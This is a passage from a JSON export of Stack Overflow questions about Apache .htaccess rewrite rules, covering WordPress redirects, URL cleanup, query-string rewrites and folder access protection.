redirecting.</p>\n\n<p>Before I installed Wordpress on the server, there was two static basic HTML-sites. One in the public_html root using the main domain and a completely different subsite in a subfolder with a htaccess rewrite rule directing the subdomain into that folder.</p>\n\n<p>Now there is Wordpress messing up the redirects. Wordpress of course made modifications to the original htaccess-file. In addition to that, the customer also had to change servers within the hosting provider to get newer php version so I had to write the htaccess file from scratch.</p>\n\n<p>Here is the current htaccess-file :</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /www/\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /www/index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n\nRewriteEngine On\nOptions +FollowSymlinks\nRewriteBase /\nRewriteCond %{HTTP_HOST} ^(www.)?subdomainurl.com$ [NC]\nRewriteCond %{REQUEST_URI} !^/subdomainfolder/\nRewriteRule ^(.*)$ subdomainfolder/$1 [L]\n</code></pre>\n\n<p>Wordpress in installed in a folder named www and the url is being rewritten, it works beautifully. But I'm having problems with the subdomain. In the code above I've replaced the subdomain url with subdomainurl.com, the site lies in public_html/subdomainfolder/.</p>\n\n<p>Now, when I type www.subdomainurl.com, the redirect works, the site is shown. But www.subdomainurl.index.html typed doesn't. It has to be written www.subdomainurl.com/subdomainfolder/index.html, so I'm clearly not writing the redirect right, adding the subdomain folder as well. I've tried to mingle with that htaccess but can't get it right. Everytime I try to change something I get a 404 in the main domain's Wordpress site.</p>\n\n<p>At the moment these work:\nwww.maindomain.com/subdomainfolder/index.html\nwww.subdomainurl.com/subdomainfolder/index.html</p>\n\n<p>And this doesn't, which I'm trying to do:\nwww.subdomainurl.com/index.html</p>\n\n<p>I'm not a redirect expert, any help would be much appreciated.</p>\n\n<p><em>Edit/Addon :</em></p>\n\n<p>Here is the old code from the old server that redirected the subdomain to the subfolder and rewrote the url, it doesn't work anymore so I ditched it.</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^(www.)?subdomainurl.com$ [NC]\nRewriteCond %{REQUEST_URI} !^/subdomainfolder/\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /subdomainfolder/$1\nRewriteCond %{HTTP_HOST} ^(www.)?subdomainurl.com$ [NC]\nRewriteRule ^(/)?$ subdomainfolder/index.html [L]\n</code></pre>\n"},{"tags":["php","apache",".htaccess","config"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12970426,"title":"htaccess file works on server, doesn't work locally","body":"<p>I've been searching around and trying all sorts of different approaches, but I can't seem to figure out what's wrong.</p>\n\n<p>I have the following piece of .htaccess code:</p>\n\n<pre><code>Options +FollowSymLinks\nIndexIgnore */*\n# Turn on the RewriteEngine\nRewriteEngine On\n#  Rules\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . index.php [L]\n</code></pre>\n\n<p>It works fine on the production server, so that insinuates that the config file is set up okay there. \nI'm trying to develop for this site locally though, and there I get 404 errors saying that the file does not exist when I go to localhost/example/login (which corresponds with domain.com/login).</p>\n\n<p>I have tried different settings, setting AllowOverride All, checking if mod_rewrite is enabled in phpinfo(); and what not. But I can't seem to figure out what's wrong.</p>\n\n<p>Any suggestions?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12970124,"title":"replace text with other using htaccess","body":"<p>I want to use replace some text from my url to show url pretty. .Please let me know how can I do it.</p>\n\n<p>for eg. \n        <a href=\"http://example.com/wp-admin\" rel=\"nofollow\">http://example.com/wp-admin</a>\n        <a href=\"http://example.com/Market\" rel=\"nofollow\">http://example.com/Market</a>\nsame I want to replace wp-login\n         <a href=\"http://example.com/wp-login\" rel=\"nofollow\">http://example.com/wp-login</a>\n        <a href=\"http://example.com/Market\" rel=\"nofollow\">http://example.com/Market</a></p>\n\n<p>I'm usign the following code.</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n    RewriteRule ^index.php$ – [L]\n    RewriteCond %{REQUEST_URI} wp-admin/\n    RewriteCond %{QUERY_STRING} !Magic\n    RewriteRule .*\\.php [F,L]\n    RewriteCond %{QUERY_STRING} !Magic\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess","dokuwiki"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12963949,"title":"preventing from the site any external links","body":"<p>I am using DokuWiki and as we've tried to secure it as much as possible the best security for us to keep it's location on our server secret. Therefore we want to make sure no link can be clicked on any pages which would reveal the location of our infrastructure. Is there any way to configure this restriction with DokuWiki or are there known ways to pass URLs through a third party?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12966298,"title":"RewriteRule For Matching Arbitrary PHP Files","body":"<p>I'm somewhat new to <code>htaccess</code> rewrite rules, and have been scratching my head for the past few days on what's happening here. No amount of Googling seemed to help, so hopefully somebody knows the answer.</p>\n\n<p>I have a site that can be accessed as:</p>\n\n<pre><code>www.site.com\nwww.site.com/684\nwww.site.com/684/some-slug-name-here\n</code></pre>\n\n<p>All of these scenarios should go to <code>index.php</code> and pass in the optional <code>id=684</code> and <code>slug=some-slug-name-here</code></p>\n\n<p>Which works fine.</p>\n\n<p>My problem is I have a separate file. Right now it's called <code>admintagger.php</code> - but this fails when I call it anything. <code>21g12fjhg2349yf234f.php</code> has the same issue.</p>\n\n<p>The problem is that that I would like to be able to access <code>admintagger.php</code> from <code>www.site.com/admintagger</code></p>\n\n<p>but it seems to be matching my rule for index, and taking me there instead.</p>\n\n<p>Here is my code:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteBase /\n\n\nRewriteRule ^imagetagger$ /imagetagger.php [NC,QSA]\nRewriteRule ^([0-9]+)/?(.*)?/?$ index.php?id=$1&amp;slug=$2 [NC,L,QSA]\n</code></pre>\n"},{"tags":["android","ios","html5",".htaccess","video"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":12967371,"title":".htaccess HTTP_USER_AGENT not working","body":"<p>I'm having problems the .htaccess file, normally it checks the user referer and if is from my site it allows the access to stream mp4 files, but now I want to allow the streaming to Android and iOS devices, I'm using html5  tag but it doesn't send http_referer so I want to check the user agent to allow the stream of the mp4 files, this is what I have but it just doesn't work.</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_USER_AGENT} \"Android|iPod|iPhone|iPad\" [NC,OR]\nRewriteCond %{HTTP_REFERER} !^http://(direct\\.|www\\.)?mysite\\.com/.*$ [NC]\nRewriteRule .*\\.(mp4)$ http://www.mysite.com [R,NC]\n</code></pre>\n"},{"tags":["php",".htaccess","wordpress-plugin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12965583,"title":"Short the uploaded pics and video url in wordpress","body":"<p>I want to show the short url of the uploaded pics and videos to the users.if the users download the pics they don't get the actual path of the pics and videos.users could not know the actual location of the pics and videos. Please let me know the how can I do it in wordpress ? Is this possible in htaccess file?</p>\n\n<p>For eg.\n  <a href=\"http://example.com/images/pic.jpg\" rel=\"nofollow\">http://example.com/images/pic.jpg</a></p>\n\n<p>I want.</p>\n\n<p><a href=\"http://example.com/pic.jpg\" rel=\"nofollow\">http://example.com/pic.jpg</a> </p>\n"},{"tags":["apache",".htaccess","mod-rewrite","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":39,"score":0,"question_id":12964019,"title":"site.com./ vs site.com/ problems with visitor tracking programs. Rewrite code?","body":"<p>I tried to search this but due to the search terms I can't find an answer anywhere, lol.</p>\n\n<p>My visitor tracking site (I use Piwik) can't decipher between the following issue below.</p>\n\n<p><strong>site.com./</strong>\nvs\n<strong>site.com/</strong></p>\n\n<p>Site.com./ when types in to find a website is of course IMO wrong, somehow others get to my site and every page they visit shows as an external link and this ./ problem.</p>\n\n<p>How can I in .htaccess (in my root of my domain) add a rule to fix this problem and possibly others that are similar to this... right now it's obviously a problem.</p>\n\n<p>Thanks all!</p>\n"},{"tags":[".htaccess","codeigniter","mod-rewrite","redirect","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12963515,"title":"Taking a site down temporarily with Codeigniter (301 possible with routes.php?)","body":"<p>I'm using Codeigniter with the standard .htaccess rewrite rules so that no /index.php/ is visible within the urls.</p>\n\n<p>Now I recently needed to take the site down temporarily and therefore wanted to redirect everyone to a 'down' page. The following worked:</p>\n\n<pre><code>$route['default_controller'] = \"down\";\n$route['(:any)'] = \"down\";\n</code></pre>\n\n<p>But I'm aware that in this case, a 301 is really appropriate.</p>\n\n<p>How and where should I set that? I don't see a way to specify it in the routes.php and was confused about how to do it within the .htaccess because of the existing rules....</p>\n\n<pre><code>RewriteBase /\n\nRewriteCond %{REQUEST_URI} ^_system.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\nRewriteCond %{REQUEST_URI} ^myapp.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\nRewriteCond $1 !^(index\\.php|resources|files|robots\\.txt)\nRewriteRule ^(.*)$ index.php/$1 \n</code></pre>\n"},{"tags":[".htaccess","url","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12963206,"title":"url rewriting : How to rewrite 2 urls with same number of parameters?","body":"<p>I've created some url rewriting rules.</p>\n\n<p>It works fine.</p>\n\n<p>But i have 2 pages with urls like that :</p>\n\n<p>actualites.php?id=xxx&amp; alias=xxx</p>\n\n<p>--> Result : id-alias.php (ex : 1-article_name.php)</p>\n\n<p>equipe.php?id=xxx&amp; alias=xxx</p>\n\n<p>--> Result : id-alias.php ((ex : 1-article_name.php)</p>\n\n<p>These 2 pages are different, not the same design, etc.</p>\n\n<p>I would like to rewrite these 2 different pages. My question is how to have two different rules for these 2 urls.</p>\n\n<p>Since they have 2 parameters, i have only one rule applied (the first one)</p>\n\n<pre><code>#become : 1-alias.php\nRewriteRule  ^([0-9]*)-(.*)\\.php$ actualites.php?cat=$1&amp;alias=$2 [L]\n\n#become : 1-alias.php\nRewriteRule  ^([0-9]*)-(.*)\\.php$ equipe.php?id_equipe=$1&amp;alias=$2 [L]\n</code></pre>\n"},{"tags":["html","regex",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12965519,"title":"htaccess with square brackets","body":"<p>Hi everyone, I have a serious problem with my <code>.htaccess</code> file.\nThe issue is that it does not seem to allow square brackets in the URL.</p>\n\n<p>I have these 2 lines: </p>\n\n<p><code>RewriteRule ^mp3/([a-zA-Z0-9-/]+).html$ index.php?dir=$1.</code></p>\n\n<p><code>RewriteRule ^mp3/([a-zA-Z0-9-/]+)/([a-zA-Z0-9-/]+).html$ index.php?dir=$1/$2 [L]</code></p>\n\n<p>This should allow me to have a URL like:\n<a href=\"http://veqhite.info/mp3/mp3/Mp3-Shqip-2012/dffds.html\" rel=\"nofollow\">http://veqhite.info/mp3/mp3/Mp3-Shqip-2012/dffds.html</a></p>\n\n<p>Where <code>Mp3-Shqip-2012</code> and <code>dffds</code> are seperate directories.\nBut when I have an URL with square brackets [] like this:\n<code>http://veqhite.info/mp3/mp3/Mp3-Shqip-2012/meda-shqip-[2012].html</code></p>\n\n<p>I receive a not found page <code>The requested URL /mp3/mp3/Mp3-Shqip-2012/meda-shqip-[2012].html was not found on this server.</code></p>\n\n<p>I think I should modify the <code>.htaccess</code> rewrite rule to allow that but I don't know how...</p>\n"},{"tags":["javascript",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":47,"score":3,"question_id":12958239,"title":"CodeIgniter and Javascript url-rewriting clash","body":"<p>My project is setup in CodeIgniter. To cleanup CI's url I added a RewriteRule to the htaccess of the page which removes the ugly 'index.php':</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule .* index.php/$0 [PT,L]\n</code></pre>\n\n<p>This rule rewrites:</p>\n\n<pre><code>https://baseurl/index.php\n</code></pre>\n\n<p>to</p>\n\n<pre><code>https://baseurl/\n</code></pre>\n\n<p>Now, \nI also want to use javascript deeplinking, because the project relies heavily on Ajax page refreshes. The deeplink looks like this:</p>\n\n<pre><code>https://baseurl/#/deeplink\n</code></pre>\n\n<p>Problem is: The rewrite rule deletes my beatifully injected deeplink and redirects the user to the root site...\nHow can i get rid of the index.php without deleting my deeplink on a hard page refresh?</p>\n\n<p>Thanks!</p>\n\n<p>Dave Timmerman</p>\n"},{"tags":[".htaccess","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12493348,"title":"Remove url segment if other segment matches string .htaccess","body":"<p>I have urls like so:</p>\n\n<pre><code>http://www.domain.com/account/home\nhttp://www.domain.com/account/settings/email\nhttp://www.domain.com/account/widget\nhttp://www.domain.com/account/widget/2\nhttp://www.domain.com/account/...\n</code></pre>\n\n<p>I would like to rewrite the url only when <strong>widget</strong> is in the 2nd segment and for it to be rewritten without the 1st segment <strong>account</strong> like so:</p>\n\n<pre><code>http://www.domain.com/widget\nhttp://www.domain.com/widget/2\nhttp://www.domain.com/widget/...\n</code></pre>\n\n<p>How would I go about doing this? I know how to remove <strong>account</strong> entirely but not selectively. </p>\n\n<p>NB <strong>account</strong> is a subfolder that my website resides in.</p>\n\n<p><strong>[EDIT]</strong></p>\n\n<p>I have found this to work, is this the best way to do it?</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^account/widget/(.*)$ /widget/$1 [L]\n</code></pre>\n"},{"tags":["php","html",".htaccess","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12864904,"title":"SEO friendly .htaccess RuleRewrites","body":"<p>I'm using a piece of e-commerce software that has product categories and the links are like:<br>\n<code>http://www.mysitename.com/mycategory--c7.html</code></p>\n\n<p>Is there an easy way to remove the \"--c7\" or whatever identifier it produces?</p>\n\n<p>This a chunk of what I found in .htacccess:</p>\n\n<pre><code>#cre SEO reformat for pages.html pages\nRewriteRule ^pd([0-9]+_?[0-9]*)-(.*)\\.html$ pages.php?pID=$1 [QSA,L]\nRewriteRule ^(.*)/c([^/]*)/p([0-9]+_?[0-9]*)/(.*)/pages\\.html$ pages.php?cID=$2&amp;pID=$3 [QSA,L]\nRewriteRule ^(.*)/c([^/]*)/pages\\.html$ pages.php?cID=$2 [QSA,L]\n</code></pre>\n\n<p>and I don't really know the notation so explain your answer just a little.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect","seo"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12960140,"title":"htaccess: redirect to subdomain if page not found","body":"<p>Here's description for my problem</p>\n\n<p>i have moved the site from this path</p>\n\n<p><a href=\"http://www.site.com/any-thing-here-workfine\" rel=\"nofollow\">http://www.site.com/any-thing-here-workfine</a></p>\n\n<p>To subdomain like this</p>\n\n<p><a href=\"http://portal.site.com/any-thing-here-workfine\" rel=\"nofollow\">http://portal.site.com/any-thing-here-workfine</a></p>\n\n<p>But to now , google has my previous links and all this links are down</p>\n\n<p>So i'm working now to move this down links from www  to sub domain if this page return notfound</p>\n\n<p><strong>Mean</strong></p>\n\n<p>My links in google still </p>\n\n<p><a href=\"http://www.site.com/any-thing-here-workfine\" rel=\"nofollow\">http://www.site.com/any-thing-here-workfine</a>   this page notfound</p>\n\n<p>so i want to redirect it 301 to same url but like thia</p>\n\n<p><a href=\"http://portal.site.com/any-thing-here-workfine\" rel=\"nofollow\">http://portal.site.com/any-thing-here-workfine</a></p>\n\n<p>How can i do this ?</p>\n"},{"tags":["apache",".htaccess","virtualhost","prestashop"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12964383,"title":"Can I in some way include a file with Redirects inside my <VirtualHost>","body":"<p>I migrating a friends webshop from one system to another and trying to make all old urls point to the new ones.</p>\n\n<p>So I got like 10Ks of lines like this:\nRewrite /a /b</p>\n\n<p>I know that I can just add them to inside my <code>&lt;VirtualHost&gt;</code> but it will be hard to read the rest of the <code>&lt;VirtualHost&gt;</code> settings then.</p>\n\n<p>The new webshop is Prestashop and it uses a .htaccess-file and has a <code>&lt;textarea&gt;</code> where you can add extra settings that you want to keep when you regenerate prestashops .htaccess-file.</p>\n\n<p>So I tried to paste all my lines into the <code>&lt;textarea&gt;</code> but it has some kind of limit, so only like half of them where stored.</p>\n\n<p>I can't just paste the lines into .htaccess with a text editor, because sometime you you change som settings in prestashop the .htaccess file needs to be generated and my manually added lines will be overwritten.</p>\n\n<p>So what i'm looking for is a way to include a file with all the Redirects, inside my  or in the .htaccess.</p>\n\n<p>Or config apache to load both .htaccess and .htacces2 or something.</p>\n"},{"tags":["php","wordpress",".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12963435,"title":"hide a folder path when user downloads a file","body":"<p>I am using wordpress for my website and there are some wallpapers in my folder which i provide for download . But i dont want users to know the exact file location of folder . As there is a subscription for the download.</p>\n\n<p>suppose my file is stored in </p>\n\n<pre><code>http://www.example.com/wp-content/example.folder/awesome.png\n</code></pre>\n\n<p>Now how to hide the folder name <code>example.folder</code> and use any fake name, That dosent shows up while downloading . Really need a big help on this. can anyone suggest me a good method. I tried some wordpress plugins , but no help on this.</p>\n"},{"tags":[".htaccess","rewrite","root"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12963237,"title":"Securely rewrite to root using htaccess","body":"<p>This has probably been asked before but I haven't seen any. So basically I have this rewrite for the profiles...:</p>\n\n<pre><code>RewriteRule ^a/([^/]+)$ profile.php?name=$1\n</code></pre>\n\n<p>...Because I can't figure out how to rewrite directly to root (The above is /a/username). Is this possible without breaking all other rewrites I have and stuff? I want something like YouTube, like /username .</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":12955867,"title":"htaccess: redirect only .html files to website root","body":"<p>I've recently upgraded a static site to a CMS and I'd like to redirect all the html files of the old site to the site's root (http://www.url.com), without affecting the CMS' PHP.</p>\n\n<p>Current htaccess looks like this</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME}/index.html !-f\nRewriteCond %{REQUEST_FILENAME}/index.php !-f\nRewriteRule . index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Obviously whatever new rules I add mustn't conflict with this.</p>\n\n<p>I'd like old files (url.com/page.html) to redirect to url.com.</p>\n\n<p>I've tried a few things after searching but nothing works. Any help appreciated.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12952225,"title":"Remove index.php AND trailing slashes from URL","body":"<p>I've got the following rewrite rules in my .htaccess, the first 4 lines are supposed to deal with allowing to access the site without index.php, and works fine, until I add the last bit which I'm trying to use to remove trailing slashes from the sites URLs.</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} !(\\.[a-zA-Z0-9]{1,5})$\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond $1 !^(uploads|cache|themes|default|admin\\.php|favicon\\.ico|robots\\.txt|index\\.php) [NC]\nRewriteRule ^(.*)$ /index.php/$1\n\n# Remove trailing slashes\nRewriteRule ^(.+)/$ http://%{HTTP_HOST}/$1 [R=301,L]\n</code></pre>\n\n<p>When I add the last line, and I visit the  root of my site, the index.php part gets appended to the URL, why is this?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12960973,"title":"htaccess - redirect query string and remove it from URL","body":"<p>I search many topic about htaccess but still not success.</p>\n\n<p>I want when people type address:</p>\n\n<pre><code>http://domain.com/?q=filename1\nhttp://domain.com/?q=filename2\n...\n</code></pre>\n\n<p>It will auto redirect to:</p>\n\n<pre><code>http://domain.com/download/filename1.html\nhttp://domain.com/download/filename2.html\n...\n</code></pre>\n\n<p>I try:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^/?q=(.*)$ /download/$1.html [L,R=301]\n</code></pre>\n\n<p>But it is not working. How can I fix this?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12961871,"title":"Bizarre interrmitent redirect problems with htaccess","body":"<p>Using <code>curl -I</code> to check the headers, I'm finding that some pages on my site do a redirect for no apparent reason. One page, <code>/sample</code> gives a 301 to <code>/sample/</code> every <strong>third</strong> time it is requested, without any reference to it in .htaccess.</p>\n\n<p>A page that is redirected with <code>RewriteRule ^sample2.htm /sample2 [NC,R,L]</code> gives a 302 except on the 4-5th request, it returns <code>sample.htm</code> instead of the redirect.</p>\n\n<p>Apache is 2.2</p>\n"},{"tags":["php","wordpress",".htaccess","wordpress-plugin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12960127,"title":"how make url obfuscated","body":"<p>I want to make the images and download videos url obfuscated in wordpress so that visitors could not see the exact path of the images and videos url. I have tried short url plugin for this but it is not working.please let me know the any plugin in wordpress which I can used or Can I do it using the htaccess file ?</p>\n"},{"tags":["regex",".htaccess","url","url-rewriting","permalink"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12947460,"title":"Removing index.php from url using .htaccess even if the user requests it","body":"<p>I never want index.php to show up in my URL, even if the user inputs it. Is this possible?</p>\n\n<p>This is variation whatever after several tries. I've come close a few times but this is where it's at for now.</p>\n\n<pre><code>RewriteEngine On  \nRewriteBase /sub-dir/  \nRewriteCond %{REQUEST_URI} index\\.php$  //If URL ends in index.php\nRewriteRule (.*)index\\.php $1  //Somehow remove index.php from the url\nRewriteCond %{REQUEST_FILENAME} !-f  \nRewriteCond %{REQUEST_FILENAME} !-d  \nRewriteRule . index.php [L]  \n</code></pre>\n\n<p>Currently I have permalink set up where if the user enters domain.com/sub-dir/my-perma-lin/ it generates a string on the page based on my-perma-link to look like My Perma Link. What I'd like is if the user submits any URL ending in index.php it just removes that from the URL but leaves everything else as is.</p>\n\n<p>domain.com/sub-dir/index.php --> domain.com/sub-dir/<br>\ndomain.com/sub-dir/my-perma-link/index.php --> domain.com/sub-dir/my-perma-link</p>\n\n<p>I've written quite a few rules in <a href=\"http://htaccess.madewithlove.be/\" rel=\"nofollow\">http://htaccess.madewithlove.be/</a> that work perfectly but when I upload it (to Dreamhost) nothing works.</p>\n\n<p>This for example should work according to the the tester</p>\n\n<pre><code>RewriteEngine On  \nRewriteBase /sub-dir/  \nRewriteCond %{REQUEST_URI} \\.php  //Not needed but thought it would/should help\nRewriteRule (.*)(index\\.php)+ $1 [L,R=301,NC]\n</code></pre>\n\n<p>But it just removes everything after /sub-dir/</p>\n\n<p>I'm either missing something super obvious or it's not possible ...</p>\n"},{"tags":[".htaccess","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12950766,"title":"When using htaccess why will documents not load","body":"<p>I am using <code>.htaccess</code> to change a <code>.php</code> file to read as <code>.html</code>\nI load my <code>page.php</code> fine in the URL as <code>site.com/page.html</code>\nbut if i were to change the page name to <code>page.html</code> then entering <code>site.com.page.html</code> into the URL will just show object not found </p>\n\n<p>My htaccess reads:</p>\n\n<pre><code>RewriteRule ^(.*)\\.html$ $1.php\n</code></pre>\n\n<p>How can i fix it so i can still change the name for .php extensions and still be able to load a normal <code>.html</code> file</p>\n"},{"tags":["php",".htaccess","url","authentication",".htpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12960351,"title":"Protecting Files in Web Folder","body":"<p>My intent is to protect all the folders and files in my web directory either through htaccess authentication or what have you. So this is my folder:<br>\n<img src=\"http://i.stack.imgur.com/OU4u5.png\" alt=\"Directory\"></p>\n\n<p>I want front to be open, so they can do <code>www.domain.com/Folder/Front.php</code> but I just don't want anyone accessing the folders/files through the url, espcially the scripts inside of the private folder. For example, I don't want anyone doing this <code>www.domain.com/Folder/Private</code> <strong>OR</strong> <code>www.domain.com/Folder/Private/Script.php</code>. The htaccess in this folder just reads:</p>\n\n<pre><code>DirectoryIndex Front.php index.html\nOptions -Indexes\n</code></pre>\n\n<p>So no one can see the content of the folder but if they knew the name of the file they could just do <code>www.domain.com/Proposals/file.doc</code>. So that's why I put an htaccess file in <em>EVERY</em> subfolder (classes, css, images, etc) that reads:</p>\n\n<pre><code>AuthType Basic\nAuthName \"Login\"\nAuthUserFile /disks/*/*/Folder/.htpasswd\n\n&lt;Limit GET POST&gt;\n    Require valid-user\n&lt;/LIMIT&gt;\n</code></pre>\n\n<p>But the problem is when you try to access the page by typing in <code>www.domain.com/Folder/Front.php</code> it asks for authentication because the authentication htaccess file is inside folders like the CSS folder which Front.php requests css data from upon loading. I don't understand why this is such a big problem, I've been trying to do this for the past 5 days now. The ONLY place the visitor should be is in Front.php, which uses all the other files like the css files and the scripts, etc. I just DONT want the user typing anything in into the URL to navigate everywhere inside the directory. </p>\n\n<p>To sum it up if they aren't in <code>www.domain.com/Folder/Front.php</code> then they are somewhere where they shouldn't be. How do I just protect against url navigations (the page requesting data from say the css files is fine)?</p>\n"},{"tags":["apache",".htaccess","url-rewriting"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":3967,"score":1,"question_id":2111182,"title":"Rewriting URL with selected query string parameters in .htaccess","body":"<p>I recently changed my CMS, and want to rewrite some of my URLs to match the new URL/query string parameter format.</p>\n\n<p>The old URL was:</p>\n\n<pre><code>http://www.mysite.com/search.cgi?tag=foo&amp;blog_id=bar&amp;other=baz\n</code></pre>\n\n<p>The new URL should be:</p>\n\n<pre><code>http://www.mysite.com/?s=foo\n</code></pre>\n\n<p>In other words, there were several query string parameters in the old format, but I only care to rewrite the <strong>tag</strong> param to <strong>s</strong> while keeping the same value.  The other parameters should be discarded.  Of course the order of the parameters shouldn't matter.  It also shouldn't matter whether tag is the only parameter or not.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["apache","wordpress",".htaccess","apache2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":143,"score":0,"question_id":4009669,"title":"How to modify .htaccess for web app (in combination with WordPress 3.0.1)","body":"<p>My question is about .htaccess</p>\n\n<p>I am using WordPress 3.0.1 as the front end of my web application.\nI want most HTTP accesses to follow the normal WordPress flow.</p>\n\n<p>However, I have created a special \"Page\" in WordPress that has embedded PHP code that powers my web app.</p>\n\n<p>URL's of this form \"http://site.com/app/\" already go to the correct page.</p>\n\n<p>URL's of this form \"http://site.com/app/?a=alpha&amp;b=beta\" go to the same page, and pass parameters to my web app.  This is correct, but the URL looks ugly.</p>\n\n<p>Here is my question:</p>\n\n<p>I want nice looking URLs of this format:</p>\n\n<pre><code>http://site.com/app/alpha/beta\n</code></pre>\n\n<p>to be rewritten this way -></p>\n\n<pre><code>http://site.com/app/?a=alpha&amp;b=beta\n</code></pre>\n\n<p>I have tried adding various things in .htaccess, but I can't get it to work.  I typically end up with a WordPress 404 page being displayed.</p>\n\n<p>Here is the .htaccess file that was created when installing WordPress 3.0.1</p>\n\n<pre><code># .htaccess\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n# END WordPress\n</code></pre>\n\n<p>I am sure there must be lots of folks using WordPress as a front end for their web app, and others with expertise in .htaccess syntax.  Any answers or pointers to solutions would be appreciated.</p>\n\n<p>thanks in advance,</p>\n\n<p>David Jones</p>\n\n<p>dxjones@gmail.com</p>\n\n<p><a href=\"http://dxjones.com\" rel=\"nofollow\">http://dxjones.com</a></p>\n"},{"tags":[".htaccess","url","url-rewriting"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":12958750,"title":"how to perform url rewriting using HTACCESS in server","body":"<p>I have the following <strong>.htaccess</strong> file</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nOptions -Indexes\nRewriteRule   ^index/?$   index1.php  [NC]\nRewriteRule   ^index/(.*\\.html)/?$   index1.php?load=$1  [NC,L]\nRewriteRule   ^page/?$   page.php  [NC]\nRewriteRule  ^page/([0-9]+)/([a-z]+)/([{a-z}{0-9}{\\-\\}]+)/?$   